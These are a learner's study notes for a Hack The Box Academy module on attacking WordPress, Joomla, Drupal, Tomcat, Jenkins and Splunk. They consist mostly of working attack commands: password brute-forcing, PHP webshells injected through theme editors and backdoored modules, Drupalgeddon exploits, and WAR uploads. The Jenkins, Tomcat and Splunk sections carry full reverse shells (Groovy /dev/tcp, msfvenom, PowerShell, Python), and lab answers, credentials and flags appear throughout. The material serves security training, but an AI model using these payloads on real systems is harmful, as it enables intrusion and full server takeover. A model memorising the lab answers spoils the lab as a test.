# HTB Academy — Attacking Common Applications: Module Notes

**Status:** In progress (Sections 1–14 of 33 complete)

---

## Section 1 — Introduction

### Target Applications Covered
| Category | Applications |
|---|---|
| Web CMS | WordPress, Joomla, Drupal |
| Application Servers | Apache Tomcat |
| Automation/CI | Jenkins |
| SIEM | Splunk |
| Network Monitoring | PRTG Network Monitor |
| Ticketing | osTicket |
| Source Control | GitLab |

### Key Mindset
- Attack angle 1: **public CVEs** against known versions
- Attack angle 2: **abuse built-in functionality** (script consoles, task runners, APIs) to get RCE — often more reliable than CVEs
- These apps appear on both external and internal assessments — often the only foothold in a hardened environment
- Default creds, unpatched versions, and misconfigs are the most common wins
- Never overlook an unfamiliar app — approach every app with a critical eye

### Lab Setup
Vhosts all point to one target IP. Add to `/etc/hosts` before any section:
```
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

---

## Section 2 — Application Discovery & Enumeration

### Workflow
1. Nmap scan of common web ports → save as XML
2. Feed XML into EyeWitness and/or Aquatone → screenshot reports
3. Review report (High Value Targets section first), note interesting hosts
4. Run deeper Nmap scan (`-sV`, top 10k ports) while reviewing screenshot report
5. Manual validation of everything interesting

### Nmap Initial Web Sweep
```
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### EyeWitness
```
sudo apt install eyewitness -y
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness --no-prompt
```
- Creates `ew.db` SQLite file in output folder
- Fingerprints apps and suggests default credentials
- Can also take Nessus XML

### Aquatone
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
cat web_discovery.xml | ./aquatone -nmap
```
- Output report: `aquatone_report.html`
- Title page header: **"Pages by Similarity"**
- Also takes Masscan XML

### What to Look For in Reports
- **Tomcat** → try default creds on `/manager` and `/host-manager` → upload malicious WAR → RCE
- **CMS (WordPress/Joomla/Drupal)** → check version, plugins/themes for CVEs
- **Dev subdomains** (anything with `dev` in FQDN) → may have debug mode, untested features
- **GitLab** → check for public repos, open registration, old commits with creds
- **osTicket** → sensitive ticket data, possible email registration abuse
- **Printers** → sometimes leak LDAP creds in cleartext
- File upload pages with no validation → immediate web shell opportunity

### Nmap Service Scan (deeper)
```
sudo nmap --open -sV <target_ip>
```

---

## Section 3 — WordPress: Discovery & Enumeration

### WordPress Quick Fingerprinting
```
curl -s http://<target>/ | grep WordPress
curl -s http://<target>/robots.txt
```
- `/wp-admin/` and `/wp-content/` in robots.txt = WordPress confirmed
- Meta generator tag reveals version: `<meta name="generator" content="WordPress 5.8" />`

### Manual Plugin/Theme Enumeration
```
curl -s http://<target>/ | grep plugins
curl -s http://<target>/ | grep themes
```
**Critical:** Homepage only loads plugins active on the homepage. Check individual posts too:
```
curl -s "http://<target>/?p=1" | grep plugins
curl -s "http://<target>/?p=2" | grep plugins
```
Plugins found via footer credit links (e.g., `Powered by "WP Sitemap Page"`) — not in asset references.

### Directory Enumeration (when listing is enabled)
```
curl -s http://<target>/wp-content/uploads/
curl -s http://<target>/wp-content/plugins/
curl -s http://<target>/wp-content/themes/
```
Traverse upload subdirectories manually — flag/sensitive files can be nested under year/month:
```
curl -s http://<target>/wp-content/uploads/2021/08/
```

### Plugin Version Fingerprinting
```
curl -s http://<target>/wp-content/plugins/<plugin>/readme.txt | grep -i "stable tag\|version"
```

### User Enumeration
- Valid username + wrong password → `"The password for username X is incorrect"`
- Invalid username → `"The username X is not registered on this site"`
- WordPress is vulnerable to user enumeration by default

### WPScan Automated Enumeration
```
sudo wpscan --url http://<target> --enumerate --api-token <token>
```
- Enumerates vulnerable plugins, themes, users, media, backups
- `--enumerate ap` for all plugins (not just vulnerable ones)
- Default threads: 5 (change with `-t`)
- Requires WPVulnDB API token for vulnerability data (25 free requests/day)

**WPScan limitations:**
- Misses plugins not referenced on the homepage (passive detection only)
- Manual grep of individual post pages catches what WPScan misses
- Always combine automated + manual enumeration

### WordPress User Roles
| Role | Access |
|---|---|
| Administrator | Full access, can edit source code → RCE |
| Editor | Publish/manage all posts |
| Author | Manage own posts |
| Contributor | Write own posts (no publish) |
| Subscriber | Browse posts only |

Admin access = code execution via theme editor or plugin upload.

### WordPress Attack Surface Summary
- 54% of known WP vulns are in **plugins**
- 31.5% in **WordPress core**
- 14.5% in **themes**
- XML-RPC (`/xmlrpc.php`) enabled → password brute-force via WPScan or Metasploit
- Directory listing on uploads → sensitive file exposure

### Notable Vulnerable Plugins (from lab)
- **mail-masta 1.0** → Unauthenticated LFI + SQL injection
- **wpDiscuz 7.0.4** → Unauthenticated RCE
- **WP Sitemap Page 1.6.4** → (check for known CVEs)
- **Contact Form 7 5.4.2** → (check for known CVEs)

---

## Section 4 — Attacking WordPress

### Login Brute Force
Use WPScan's xmlrpc method — faster than wp-login:
```
sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://<target>
```
Lab credentials found: `doug:jessica1`

### RCE via Theme Editor (requires admin access)
1. Log into `/wp-admin` → Appearance → Theme Editor
2. Select an **inactive** theme (e.g. Twenty Nineteen) → click Select
3. Click `404.php` in the file list
4. Add `system($_GET[0]);` just after the opening comment block
5. Click Update File → execute commands:
```
curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=id"
```

**Critical gotcha:** The file already opens with `<?php` on line 1. Adding `<?php system($_GET[0]); ?>` (with tags) inside it causes a 500 syntax error. Use bare `system($_GET[0]);` only — no opening/closing PHP tags.

**Space gotcha:** Use `%20` not `+` in query strings for system commands passed via curl.

**Flag location gotcha:** The "webroot" flag is NOT in wp-content/uploads — it's a uniquely named file directly in the WordPress install root. Always `ls` the webroot first:
```
curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=ls%20/var/www/<vhost>/"
```

### wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)
File upload bypass — MIME type detection bypassed to upload PHP webshell:
```
python3 wp_discuz.py -u http://<target> -p /?p=1
```
Script may fail at execution step — use curl directly against the uploaded file:
```
curl -s "http://<target>/wp-content/uploads/<year>/<month>/<filename>.php?cmd=id"
```

### mail-masta 1.0 — Unauthenticated LFI
Direct file inclusion via `pl` parameter, no validation:
```
curl -s "http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

---

## Section 5 — Joomla: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>/administrator/manifests/files/joomla.xml | grep "<version>"
curl -s http://<target>/README.txt | head -n 5
```

### Automated Enumeration
```
droopescan scan joomla --url http://<target>/
```
Install via: `sudo pip3 install droopescan`

### Login Brute Force
Download: `sudo wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py`
```
sudo python3 joomla-brute.py -u http://<target> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Key Paths
- Admin login: `/administrator/index.php`
- Version info: `/administrator/manifests/files/joomla.xml`
- Version approx: `/plugins/system/cache/cache.xml`
- Robots.txt reveals structure: `/administrator/`, `/components/`, `/plugins/`, etc.

### Lab Answers (app.inlanefreight.local)
- Q1 version: `3.10.0`
- Q2 password: `turnkey`

---

## Section 6 — Attacking Joomla

### RCE via Template Editor (requires admin)
1. Login to `/administrator` → Configuration → Templates → protostar → error.php
2. Add `system($_GET[0]);` → Save & Close
3. Execute: `curl -s "http://<target>/templates/protostar/error.php?0=id"`

### CVE-2019-10945 — Directory Traversal (Joomla 1.5.0–3.9.4)
```
git clone https://github.com/dpgg101/CVE-2019-10945
python3 CVE-2019-10945/CVE-2019-10945.py --url "http://<target>/administrator/" --username admin --password admin --dir /
```
Lists webroot contents — look for flag files, then read via webshell or direct URL.

**Workflow:** dir traversal finds the flag filename → webshell reads it:
```
curl -s "http://<target>/templates/protostar/error.php?0=cat%20/var/www/<vhost>/<flagfile>"
```

---

## Section 7 — Drupal: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>/ | grep Drupal
curl -s http://<target>/CHANGELOG.txt | grep -m2 ""
curl -s http://<target>/robots.txt | grep node
```
CHANGELOG.txt gives exact version on older installs — newer Drupal blocks it (404).

### Automated Enumeration
```
droopescan scan drupal -u http://<target>/
```
More capable for Drupal than Joomla. Finds plugins, version, interesting URLs.

### Key Paths
- Admin login: `/user/login`
- Version: `/CHANGELOG.txt`, `/README.txt`
- Nodes: `/node/<id>` — identifies Drupal even with custom themes

### Lab Answers
- drupal-qa.inlanefreight.local version: `7.30`

---

### Lab Answers (dev.inlanefreight.local — Joomla 3.9.4, admin:admin)
- Q1 flag: `j00mla_c0re_d1rtrav3rsal!` (flag_6470e394cbf6dab6a91682cc8585059b.txt in webroot)

---

### Lab Answers
- Q1 user: `doug`
- Q2 password: `jessica1`
- Q3 bash user: `webadmin`
- Q4 flag: `l00k_ma_unAuth_rc3!` (at `/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt`)

---

## Section 8 — Attacking Drupal

### PHP Filter Module (Drupal 7, pre-auth requires admin)
1. Login as admin → `admin/modules` → enable **PHP filter**
2. Content → Add content → Basic page
3. Body: `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`
4. Text format: **PHP code** → Save (note the node number)
5. Execute: `curl -s "http://<target>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"`

For Drupal 8+: download and install `php-8.x-1.1.tar.gz` module first, then same steps.

### Backdoored Module Upload (any version with admin)
1. Download a real module: `wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
2. Extract: `tar xvf captcha-8.x-1.2.tar.gz`
3. Create webshell `shell.php`: `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`
4. Create `.htaccess`:
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
5. Move both into captcha dir, repackage: `tar cvf captcha.tar.gz captcha/`
6. Admin → Extend → Install new module → upload archive
7. Execute: `curl -s <target>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Drupalgeddon (CVE-2014-3704) — Drupal 7.0–7.31, pre-auth SQLi
```
python2.7 drupalgeddon.py -t http://<target> -u hacker -p pwnd
```
Creates admin user → log in → use PHP filter or module upload for RCE.
Metasploit: `exploit/multi/http/drupal_drupageddon`

### Drupalgeddon2 (CVE-2018-7600) — Drupal < 7.58 / < 8.5.1, unauthenticated RCE
```
git clone https://github.com/a2u/CVE-2018-7600
```
Modify script to write a webshell:
```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
Run PoC → `curl http://<target>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Drupalgeddon3 (CVE-2018-7602) — authenticated RCE, requires session cookie
Metasploit: `exploit/multi/http/drupal_drupageddon3`
- Set `DRUPAL_SESSION`, `DRUPAL_NODE`, `VHOST`, `RHOSTS`, `LHOST`

### Key Gotchas
- Flag files are uniquely named — always `ls` the target directory first
- All vhosts on same box — RCE on any instance reaches all webroot directories
- drupal-qa (7.30) → Drupalgeddon; drupal-dev → Drupalgeddon2; drupal-acc → Drupalgeddon3

### Lab Answers
- Section 8 flag: `DrUp@l_drUp@l_3veryWh3Re!` (at `/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt`)
- Got RCE via Metasploit `exploit/multi/http/drupal_drupageddon` on drupal-qa (Drupal 7.30)

---

## Section 9 — Tomcat: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>:<port>/docs/ | grep Tomcat
curl -sI http://<target>:<port>/login
```
- `X-Jenkins` header reveals version on Jenkins; `X-Hudson` also present
- `/docs/` page title contains version
- 404 error page reveals version on older configs

### Key Paths
- Manager GUI: `/manager/html` (requires `manager-gui` role)
- Host Manager: `/host-manager/html`
- Default port: 8080 (also common: 8180, 8443)

### Key Files
- `conf/tomcat-users.xml` — credentials and roles
- `webapps/<app>/WEB-INF/web.xml` — routes and servlet mappings (useful for LFI)

### Roles
| Role | Access |
|---|---|
| manager-gui | HTML GUI + status pages |
| manager-script | Text API + status pages |
| manager-jmx | JMX proxy + status pages |
| manager-status | Status pages only |

### Gobuster Enumeration
```
gobuster dir -u http://<target>:<port>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### Lab Answers
- web01.inlanefreight.local:8180 version: `10.0.10`
- admin role in config example: `admin-gui`

---

## Section 10 — Attacking Tomcat

### Login Brute Force
```
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set VHOST <vhost>; set RPORT <port>; set STOP_ON_SUCCESS true; set RHOSTS <ip>; run"
```
Default wordlists: `tomcat_mgr_default_users.txt` / `tomcat_mgr_default_pass.txt`

### WAR File Upload (requires manager-gui role)
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

**Upload via curl (requires session cookie + CSRF token — two-step):**
```
curl -c /tmp/tc.txt -b /tmp/tc.txt -u <user>:<pass> -s "http://<target>/manager/html" -o /tmp/tc_page.html
grep -o 'CSRF_NONCE=[A-F0-9]*' /tmp/tc_page.html | head -1
curl -c /tmp/tc.txt -b /tmp/tc.txt -u <user>:<pass> -F "deployWar=@backup.war" "http://<target>/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=<TOKEN>"
```

**Execute via webshell:**
```
curl -s -G "http://<target>/backup/cmd.jsp" --data-urlencode "cmd=id"
```
- Use `--data-urlencode` with `-G` — `Runtime.exec()` doesn't interpret shell operators
- No `2>/dev/null` — it gets passed literally and breaks the command

### msfvenom WAR (reverse shell instead of webshell)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4443 -f war > backup.war
nc -lnvp 4443
```
Upload same way, then browse to `/backup/` to trigger.

### CVE-2020-1938 Ghostcat (pre-auth LFI, AJP port 8009)
Affects all Tomcat < 9.0.31 / < 8.5.51 / < 7.0.100
```
nmap -sV -p 8009,8080 <target>
python2.7 tomcat-ajp.lfi.py <target> -p 8009 -f WEB-INF/web.xml
```
Can only read files within the webapps folder.

### Key Gotchas
- `manager-gui` role does NOT allow `/manager/text/` API — need `manager-script` for that
- CSRF token is session-bound — must fetch token and upload using the same cookie jar
- Flag files are in webapps directory, not at a predictable path — always `ls` first

### Lab Answers
- Creds: `tomcat:root`
- Flag: `t0mcat_rc3_ftw!` (at `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`)

---

## Section 11 — Jenkins: Discovery & Enumeration

### Fingerprinting
```
curl -sI http://<target>:<port>/login
```
- `X-Jenkins` response header contains version
- `X-Hudson` header also present (Jenkins was originally Hudson)
- Default port: 8080 (also common: 8000)
- Management/slave communication: port 5000

### Auth Options
- Jenkins own user database (default)
- LDAP, Unix user database, no authentication
- Default trial creds: `admin:admin`

### Lab Answers
- jenkins.inlanefreight.local:8000 version: `2.303.1`

---

## Section 12 — Attacking Jenkins

### RCE via Groovy Script Console (`/script`)
The script console runs Apache Groovy on the Jenkins controller — equivalent to a webshell.

**Execute OS command:**
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Via curl (requires crumb + session cookie together):**
```python
import requests

url = "http://<target>:<port>"
auth = ("admin", "admin")

s = requests.Session()
crumb_json = s.get(f"{url}/crumbIssuer/api/json", auth=auth).json()
crumb = crumb_json["crumb"]
field = crumb_json["crumbRequestField"]

script = """
def cmd = 'cat /path/to/flag'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
"""

r = s.post(f"{url}/scriptText", auth=auth, headers={field: crumb}, data={"script": script})
print(r.text)
```

**Reverse shell (Linux):**
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Windows command execution:**
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

### Key Gotchas
- Jenkins CSRF crumb is session-bound — must use `requests.Session()` so crumb and POST share the same session
- Fetching crumb with one request and POSTing with another (different session) = 403
- Jenkins often runs as root (Linux) or SYSTEM (Windows) — high-value target

### Lab Answers
- Creds: `admin:admin`
- Flag: `f33ling_gr00000vy!` (at `/var/lib/jenkins3/flag.txt`)

---

## Section 13 — Splunk: Discovery & Enumeration

### Fingerprinting
```
curl -sk https://<target>:8089/services/server/info | grep version
```
- Web UI: port 8000
- Management/REST API: port 8089
- Version exposed unauthenticated via REST API even when web UI requires auth

### Auth Notes
- Default creds (older): `admin:changeme`
- Trial converts to free (no auth) after 60 days
- Free version: no authentication on web UI
- Common weak passwords: `admin`, `Welcome1`, `Password123`, `Welcome`, `changeme`

### Test credentials via REST API
```
curl -sk -X POST "https://<target>:8089/services/auth/login" -d "username=admin&password=<pass>" -w " %{http_code}"
```
200 + sessionKey = valid creds.

### Lab Answers
- Version: `8.2.2`
- OS: Windows Server

---

## Section 14 — Attacking Splunk

### RCE via Custom App (scripted input)
Splunk runs scripted inputs automatically — plant a reverse shell script in a custom app.

**Directory structure:**
```
splunk_shell/
├── bin/
│   ├── run.ps1    (PowerShell reverse shell — Windows)
│   ├── run.bat    (calls run.ps1 — Windows)
│   └── rev.py     (Python reverse shell — Linux)
└── default/
    └── inputs.conf
```

**inputs.conf (Windows):**
```
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

**inputs.conf (Linux):**
```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

**run.bat:**
```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

**run.ps1 (PowerShell reverse shell):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**rev.py (Linux):**
```python
import sys,socket,os,pty
ip="<LHOST>"
port="<LPORT>"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

**Package and upload:**
```
tar -cvzf updater.tar.gz splunk_shell/
```
Upload via: Apps → Manage Apps → Install app from file → Browse → Upload (check Upgrade app if re-uploading)

**Get session token via REST API:**
```
curl -sk -X POST "https://<target>:8089/services/auth/login" -d "username=admin&password=<pass>"
```

### Read flag on Windows shell
```
type c:\loot\flag.txt
```

### Key Gotchas
- Splunk often runs as root (Linux) or SYSTEM (Windows)
- Use `type` not `cat` to read files in Windows cmd/PowerShell
- Python socket reverse shell fails on Windows Splunk due to firewall — use PowerShell
- Use the repo linked in the section for a working pre-built package structure
- If web UI requires auth but REST API doesn't — test creds via `8089/services/auth/login`
- Deployment server compromise → can push apps to all Universal Forwarders on the network

### Lab Answers
- Creds: `admin:Welcome1`
- Flag: `l00k_ma_no_AutH!` (at `c:\loot\flag.txt`)
- Shell received as `NT AUTHORITY\SYSTEM`
